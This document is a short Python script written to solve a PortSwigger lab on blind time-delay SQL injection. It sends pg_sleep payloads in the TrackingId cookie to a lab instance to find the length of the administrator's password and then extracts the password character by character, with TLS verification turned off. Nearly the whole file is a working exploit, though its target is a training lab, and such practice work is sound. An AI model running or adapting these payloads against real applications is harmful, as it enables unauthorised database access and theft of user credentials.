#for portswigger lab "Blind SQL injection with time delays and information retrieval".  Assumes that we already know the table is users with columns username and password.

import requests
import os
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

for x in range (1,100):

	cookies = {'TrackingId':"a'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)+=+{})+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--".format(x), 'session': 'uh3WFS37iCNOdodWEDlqvmBRZ0wO0ivP'}
	warnings.simplefilter('ignore',InsecureRequestWarning) #ignores insecure certificate warning
	response = requests.get('https://0a4000c604ca1554c0cc139f00e10000.web-security-academy.net/filter?category=Accessories',cookies=cookies, proxies=proxy, verify=False) #verify=False important to allow for the connection even though not secure
	print(response.elapsed.total_seconds())
	if response.elapsed.total_seconds() > 5:
		print("\n****The password is {} characters***".format(x))
		print("Now testing for the password...stay tuned...\n")
		break
password = ""

for x in range (1,21):

	for y in "0123456789abcdefghijklmnopqrstuvwxyz":

		cookies = {'TrackingId': "a'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,{},1)='{}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--".format(x,y), 'session': 'uh3WFS37iCNOdodWEDlqvmBRZ0wO0ivP'}
		warnings.simplefilter('ignore',InsecureRequestWarning) #ignores insecure certificate warning
		response = requests.get('https://0a4000c604ca1554c0cc139f00e10000.web-security-academy.net/filter?category=Accessories',cookies=cookies, proxies=proxy, verify=False) #verify=False important to allow for the connection even though not secure
		if response.elapsed.total_seconds() > 9:
			print(y, sep=' ', end='', flush=True)
			password = password + y
			break
print("\n\n****The password is {}!!!****\n".format(password)) 
